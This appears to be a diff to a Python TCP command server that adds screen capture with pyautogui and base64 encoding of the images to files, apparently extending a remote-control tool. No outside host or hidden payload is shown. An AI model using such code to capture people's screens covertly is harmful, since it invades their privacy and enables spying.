@@ -4,6 +4,11 @@ import platform
 import os
 import sys
 import subprocess
+import numpy as np
+import cv2
+import pyautogui
+import base64
+import random
 
 from subprocess import Popen
 from typing import Any, Literal
@@ -28,7 +33,7 @@ class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
 class Commands:
     def __init__(self: object) -> None:
         pass
-
+    
     def getOs(self: object) -> str:
         """
         It returns a string containing the system, release, and name of the operating system
@@ -61,8 +66,65 @@ class Commands:
         p.kill()
         return 0
 
-    
+    def Screenshot(self: object) -> str:
+        """
+        It takes a screenshot of the screen, converts it to a numpy array, converts it to a
+        BGR image, and saves it as a .png file
+        :return: The name of the image.
+        """
+        image = pyautogui.screenshot()
 
+        image = cv2.cvtColor(np.array(image),
+                             cv2.COLOR_RGB2BGR)
+        
+        self.nameImage = "image1.png"
+        cv2.imwrite(self.nameImage, image)
+        return self.nameImage
+    
+    def convertImageToString(self: object, nameImage: str) -> tuple[str, bytes]:
+        """
+        It takes an image file, converts it to a string, and then writes that string to a
+        binary file
+        
+        :param self: object
+        :type self: object
+        :param nameImage: The name of the image to be converted to string
+        :type nameImage: str
+        :return: The name of the file and the string converted.
+        """
+        with open(nameImage, 'rb') as image2string:
+            stringConverted = base64.b64encode(image2string.read())
+        
+        self.fileBin = f'encoded{random.random()}.bin'
+        
+        with open(self.fileBin, "wb") as file:
+            file.write(stringConverted)
+        
+        return (self.fileBin, stringConverted)
+    
+    def convertStringToImage(self: object, nameBinFile: str) -> str:
+        """
+        It opens the binary file, reads the bytes, closes the file, then opens a new file with
+        the same name but with a different extension, writes the decoded bytes to the new
+        file, and closes the new file
+        
+        :param self: object
+        :type self: object
+        :param nameBinFile: The name of the binary file that you want to convert to an image
+        :type nameBinFile: str
+        :return: The name of the decoded image.
+        """
+        file = open(nameBinFile, 'rb')
+        byte = file.read()
+        file.close()
+        
+        self.imageNameDecoded = nameBinFile.replace('bin', 'jpeg')
+        
+        decodeit = open(self.imageNameDecoded, 'wb')
+        decodeit.write(base64.b64decode(byte))
+        decodeit.close()
+        return self.imageNameDecoded
+        
 
 class Server:
     def __init__(self: object, PORT: int, HOST: str, ThreadedTCPInstace: Any | ThreadedTCPServer) -> None:
